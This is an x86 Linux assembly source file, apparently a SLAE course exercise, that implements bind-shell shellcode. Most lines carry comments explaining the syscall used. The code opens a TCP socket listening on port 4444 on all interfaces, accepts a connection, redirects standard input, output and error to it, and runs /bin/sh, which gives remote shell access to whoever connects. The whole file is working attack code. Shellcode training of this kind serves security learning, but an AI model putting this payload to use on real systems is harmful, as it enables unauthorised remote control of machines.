;;;;;;;;;;;;;;;;;;;;;;;;;;
;;			;;
;; Author: Anubis	;;
;; SLAE			;;
;;			;;
;;;;;;;;;;;;;;;;;;;;;;;;;;

global _start




section .text
	_start:

	; set needed registers to zero

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx


	; setting arguments

	mov bl, 2 	; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
	mov cl, 1	; setting up SOCK_STREAM, as seen in C code and pulled from /usr/include/i386-linux-gnu/bits/socket_type.h
	mov dl, 6	; setting protocol again as in C code, pulled from /usr/include/linux/netinet/in.h
	
	mov ax, 359	; syscall socket()
	
	int 0x80	; create the socket ( socket() in C code ) 


	xor edx, edx	; clear out edx
	mov ebx, eax	; put the value of the socket creation into ebx
	push edx	; We want the bind shell to listen on all interfaces, so pushing all zeroes will accomplish this
	push word 0x5c11 ; this is the port (4444) in little endian
	push word 0x02	; making the the in_family AF_INET again, and doing word for stack management
	mov ecx, esp	; point the top of the stack that contains the sockaddr structure
	mov dl, 16	; #define __SOCK_SIZE__   16              /* sizeof(struct sockaddr)      */ --> in /usr/include/linux/in.h
	mov ax, 361	; bind syscall 
	
	int 0x80	; execute bind


	xor ecx, ecx	; remove esp pointer from ecx
	mov ax, 363	; listen syscall

	int 0x80	; listen for connections

	xor esi, esi	; clear out esi to use as a pointer
	xor edx, edx	; clear out edx
	mov ax, 364	; syscall accept4 (since accept doesn't return any value, and with no flag set accept4 acts identical to accept)
	
	int 0x80	; executing awaiting connections


	mov ebx, eax	; preservation from accept syscall
	mov cl, 3	; set all 3 file descriptors (standard in, out, and error)

	call_dup:
	
	xor eax, eax
	mov al, 63	; syscall dup2
	dec ecx
	
	int 0x80	; dup2 stdin
	
	inc ecx
	loop call_dup


	xor ecx, ecx
	push ecx	; zero out top of stack
	push  0x68732f2f ; push the end of "/bin//sh"
	push  0x6e69622f ; push the beginning of "/bin//sh", must do it backwards because of how higher memory goes on top of stack first

	mov ebx, esp	; mov pointer to /bin//sh into ebx
	mov al, 11	; execve syscall

	int 0x80	; execute /bin//sh "shell"


	xor eax, eax
	mov al, 1	; syscall exit
	
	int 0x80	; exit program


	
